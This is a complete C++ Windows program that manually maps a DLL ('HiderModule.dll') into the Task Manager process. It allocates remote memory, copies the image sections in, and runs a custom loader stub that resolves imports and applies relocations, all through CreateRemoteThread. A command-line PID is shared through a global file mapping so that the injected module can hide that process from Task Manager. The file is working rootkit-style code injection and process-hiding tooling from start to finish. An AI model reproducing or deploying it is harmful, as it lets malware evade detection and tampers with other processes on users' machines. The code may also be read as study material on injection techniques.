#undef UNICODE

#include <iostream>
#include <string>
#include <vector>
#include <windows.h>
#include <tlhelp32.h>

static const std::string TASKMGR_IMAGE = "Taskmgr.exe";
static const std::string HIDER_IMAGE = "HiderModule.dll";

static const std::string PID_MAPPING_NAME = "Global\\HiddenPIDMapping";

using DllMainPtr = BOOL	(*APIENTRY)(
	HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
);

using LoadLibraryAPtr = HMODULE (*WINAPI)(
	LPCSTR lpLibFileName
);

using GetProcAddressPtr = FARPROC (*WINAPI)(
	HMODULE hModule,
	LPCSTR lpProcName
);

HANDLE get_process_handle(const std::string& image)
{
	auto snapshot_handle = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot_handle == INVALID_HANDLE_VALUE)
	{
		return nullptr;
	}

	PROCESSENTRY32 entry = { 0 };
	entry.dwSize = sizeof(PROCESSENTRY32);

	if (!::Process32First(snapshot_handle, &entry))
	{
		::CloseHandle(snapshot_handle);
		return nullptr;
	}

	auto process_handle = static_cast<HANDLE>(nullptr);

	do
	{
		if (image != entry.szExeFile)
		{
			continue;
		}

		process_handle = ::OpenProcess(PROCESS_ALL_ACCESS, false, entry.th32ProcessID);
		break;
	} while (::Process32Next(snapshot_handle, &entry));

	::CloseHandle(snapshot_handle);
	return process_handle;
}

HANDLE map_hidden_pid_globally(int hidden_pid)
{
	auto mapping_handle = ::CreateFileMappingA(
		INVALID_HANDLE_VALUE,
		nullptr,
		PAGE_READWRITE,
		0,
		sizeof(hidden_pid),
		PID_MAPPING_NAME.c_str()
	);
	if (!mapping_handle)
	{
		return nullptr;
	}

	auto p_hidden_pid = reinterpret_cast<int*>(::MapViewOfFile(
		mapping_handle,
		FILE_MAP_WRITE,
		0,
		0,
		sizeof(hidden_pid)
	));
	if (!p_hidden_pid)
	{
		::CloseHandle(mapping_handle);
		return nullptr;
	}

	*p_hidden_pid = hidden_pid;

	::UnmapViewOfFile(p_hidden_pid);

	return mapping_handle;
}

std::string get_absolute_path(const std::string& relative_path)
{
	std::string absolute_path;
	absolute_path.resize(MAX_PATH, '\0');

	::GetFullPathNameA(
		relative_path.c_str(),
		absolute_path.size(),
		const_cast<char*>(absolute_path.c_str()),
		nullptr
	);

	return absolute_path;
}

bool read_file(const std::string& path, std::vector<unsigned char>& buffer)
{
	auto file_handle = ::CreateFileA(
		path.c_str(),
		GENERIC_READ,
		FILE_SHARE_READ,
		nullptr,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		nullptr
	);
	if (file_handle == INVALID_HANDLE_VALUE)
	{
		return false;
	}

	DWORD size_high{}; // ignored - no legitimate DLL will be larger than 4GB...
	auto size_low = ::GetFileSize(file_handle, &size_high);

	buffer.resize(size_low);

	DWORD bytes_read{};
	auto success = ::ReadFile(
		file_handle,
		buffer.data(),
		size_low,
		&bytes_read,
		nullptr
	);
	if (!success || bytes_read != size_low)
	{
		::CloseHandle(file_handle);
		return false;
	}

	::CloseHandle(file_handle);
	return true;
}

struct LoaderStubParameters
{
	unsigned char* image_base;
	LoadLibraryAPtr load_library_a;
	GetProcAddressPtr get_proc_address;
};

void loader_stub(LoaderStubParameters* parameters)
{
	auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(parameters->image_base);
	auto nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(parameters->image_base + dos_header->e_lfanew);

	auto dll_main = reinterpret_cast<DllMainPtr>(parameters->image_base + nt_headers->OptionalHeader.AddressOfEntryPoint);

	// resolve imports
	for (auto import_descriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(
		parameters->image_base + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
		import_descriptor->Name;
		import_descriptor++)
	{
		auto module_name = reinterpret_cast<char*>(parameters->image_base + import_descriptor->Name);
		auto module = parameters->load_library_a(module_name);

		for (PIMAGE_THUNK_DATA ilt_entry = reinterpret_cast<PIMAGE_THUNK_DATA>(
			parameters->image_base + import_descriptor->OriginalFirstThunk),
			iat_entry = reinterpret_cast<PIMAGE_THUNK_DATA>(parameters->image_base + import_descriptor->FirstThunk);
			ilt_entry->u1.AddressOfData;
			ilt_entry++, iat_entry++)
		{
			unsigned long long import_address = 0;
			auto raw_ilt_entry = *reinterpret_cast<unsigned long long*>(ilt_entry);

			if (!(raw_ilt_entry & 0x8000000000000000))
			{
				auto import_name = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(parameters->image_base + ilt_entry->u1.AddressOfData)->Name;
				import_address = reinterpret_cast<unsigned long long>(
					parameters->get_proc_address(module, import_name));
			}
			else
			{
				auto ordinal = ilt_entry->u1.Ordinal & 0xffff;
				import_address = reinterpret_cast<unsigned long long>(
					parameters->get_proc_address(module, reinterpret_cast<LPCSTR>(ordinal)));
			}

			iat_entry->u1.Function = import_address;
		}
	}

	// fix relocs
	auto delta = reinterpret_cast<unsigned long long>(parameters->image_base - nt_headers->OptionalHeader.ImageBase);

	for (auto base_relocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
		parameters->image_base + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
		base_relocation->VirtualAddress;
		base_relocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
			reinterpret_cast<unsigned char*>(base_relocation) + base_relocation->SizeOfBlock))
	{
		if (base_relocation->SizeOfBlock == sizeof(IMAGE_BASE_RELOCATION))
		{
			continue;
		}

		auto reloc_offsets = reinterpret_cast<WORD*>(
			reinterpret_cast<unsigned char*>(base_relocation) + sizeof(IMAGE_BASE_RELOCATION));
		auto reloc_count = (base_relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

		for (auto reloc_index = 0; reloc_index < reloc_count; reloc_index++)
		{
			*reinterpret_cast<unsigned long long*>(
				parameters->image_base + base_relocation->VirtualAddress + (reloc_offsets[reloc_index] & 0xfff)) += delta;
		}
	}

	// call entry
	dll_main(reinterpret_cast<HMODULE>(parameters->image_base), DLL_PROCESS_ATTACH, nullptr);
}

void loader_stub_end()
{
}

bool inject_module(HANDLE process_handle, const std::string& module_image)
{
	std::vector<unsigned char> buffer;
	auto success = read_file(module_image, buffer);
	if (!success || buffer.size() == 0)
	{
		return false;
	}

	auto raw_buffer = buffer.data();
	
	auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(raw_buffer);
	if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return false;
	}

	auto nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(raw_buffer + dos_header->e_lfanew);
	if (nt_headers->Signature != IMAGE_NT_SIGNATURE)
	{
		return false;
	}

	auto image_size = nt_headers->OptionalHeader.SizeOfImage;

	auto image_buffer = reinterpret_cast<unsigned char*>(::VirtualAllocEx(
		process_handle,
		nullptr,
		image_size,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE
	));
	if (!image_buffer)
	{
		return false;
	}

	auto headers_size = nt_headers->OptionalHeader.SizeOfHeaders;

	SIZE_T bytes_written{};
	success = ::WriteProcessMemory(
		process_handle,
		image_buffer,
		raw_buffer,
		headers_size,
		&bytes_written
	);
	if (!success || bytes_written != headers_size)
	{
		::VirtualFreeEx(
			process_handle,
			image_buffer,
			0,
			MEM_RELEASE
		);

		return false;
	}

	auto section_count = nt_headers->FileHeader.NumberOfSections;
	auto section_headers = reinterpret_cast<PIMAGE_SECTION_HEADER>(raw_buffer + dos_header->e_lfanew +
		sizeof(IMAGE_NT_HEADERS) - sizeof(IMAGE_OPTIONAL_HEADER) + nt_headers->FileHeader.SizeOfOptionalHeader);

	for (auto i = 0; i < section_count; i++)
	{
		const auto& current_section_header = section_headers[i];
		
		success = ::WriteProcessMemory(
			process_handle,
			image_buffer + current_section_header.VirtualAddress,
			raw_buffer + current_section_header.PointerToRawData,
			current_section_header.SizeOfRawData,
			&bytes_written
		);
		if (!success || bytes_written != current_section_header.SizeOfRawData)
		{
			::VirtualFreeEx(
				process_handle,
				image_buffer,
				0,
				MEM_RELEASE
			);

			return false;
		}
	}

	auto loader_size = reinterpret_cast<unsigned long long>(&loader_stub_end) - reinterpret_cast<unsigned long long>(&loader_stub);
	
	auto loader = ::VirtualAllocEx(
		process_handle,
		nullptr,
		loader_size,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE
	);
	if (!loader)
	{
		::VirtualFreeEx(
			process_handle,
			image_buffer,
			0,
			MEM_RELEASE
		);

		return false;
	}

	success = ::WriteProcessMemory(
		process_handle,
		loader,
		&loader_stub,
		loader_size,
		&bytes_written
	);
	if (!success || bytes_written != loader_size)
	{
		::VirtualFreeEx(
			process_handle,
			image_buffer,
			0,
			MEM_RELEASE
		);

		::VirtualFreeEx(
			process_handle,
			loader,
			0,
			MEM_RELEASE
		);

		return false;
	}

	LoaderStubParameters params = { 0 };
	params.image_base = image_buffer;
	params.load_library_a = &LoadLibraryA;
	params.get_proc_address = &GetProcAddress;

	auto loader_params = ::VirtualAllocEx(
		process_handle,
		nullptr,
		sizeof(LoaderStubParameters),
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE
	);
	if (!loader_params)
	{
		::VirtualFreeEx(
			process_handle,
			image_buffer,
			0,
			MEM_RELEASE
		);

		::VirtualFreeEx(
			process_handle,
			loader,
			0,
			MEM_RELEASE
		);

		return false;
	}

	success = ::WriteProcessMemory(
		process_handle,
		loader_params,
		&params,
		sizeof(LoaderStubParameters),
		&bytes_written
	);
	if (!success || bytes_written != sizeof(LoaderStubParameters))
	{
		::VirtualFreeEx(
			process_handle,
			image_buffer,
			0,
			MEM_RELEASE
		);

		::VirtualFreeEx(
			process_handle,
			loader,
			0,
			MEM_RELEASE
		);

		::VirtualFreeEx(
			process_handle,
			loader_params,
			0,
			MEM_RELEASE
		);

		return false;
	}
	
	auto thread_handle = ::CreateRemoteThread(
		process_handle,
		nullptr,
		0,
		reinterpret_cast<LPTHREAD_START_ROUTINE>(loader),
		loader_params,
		0,
		nullptr
	);
	if (!thread_handle)
	{
		::VirtualFreeEx(
			process_handle,
			image_buffer,
			0,
			MEM_RELEASE
		);

		::VirtualFreeEx(
			process_handle,
			loader,
			0,
			MEM_RELEASE
		);

		::VirtualFreeEx(
			process_handle,
			loader_params,
			0,
			MEM_RELEASE
		);

		return false;
	}

	::WaitForSingleObject(
		thread_handle,
		INFINITE
	);

	::VirtualFreeEx(
		process_handle,
		loader,
		0,
		MEM_RELEASE
	);

	::VirtualFreeEx(
		process_handle,
		loader_params,
		0,
		MEM_RELEASE
	);

	::CloseHandle(thread_handle);

	return true;
}

int main(int argc, char* argv[])
{
	if (argc < 2)
	{
		std::cout << "[-] usage: " << argv[0] << " pid" << std::endl;
		return 1;
	}

	auto hidden_pid = std::stol(argv[1]);

	auto taskmgr_handle = get_process_handle(TASKMGR_IMAGE);
	if (!taskmgr_handle)
	{
		std::cout << "[-] could not obtain a handle to the task manager process." << std::endl;
		return 1;
	}

	auto mapping_handle = map_hidden_pid_globally(hidden_pid);
	if (!mapping_handle)
	{
		std::cout << "[-] could not map the hidden pid globally." << std::endl;
		return 1;
	}

	auto success = inject_module(taskmgr_handle, get_absolute_path(HIDER_IMAGE));
	if (success)
	{
		std::cout << "[+] successfully injected the hider module into the task manager process." << std::endl;
	}
	else
	{
		std::cout << "[-] could not inject the hider module into the task manager process." << std::endl;
	}

	::CloseHandle(mapping_handle);
	::CloseHandle(taskmgr_handle);

	return 0;
}
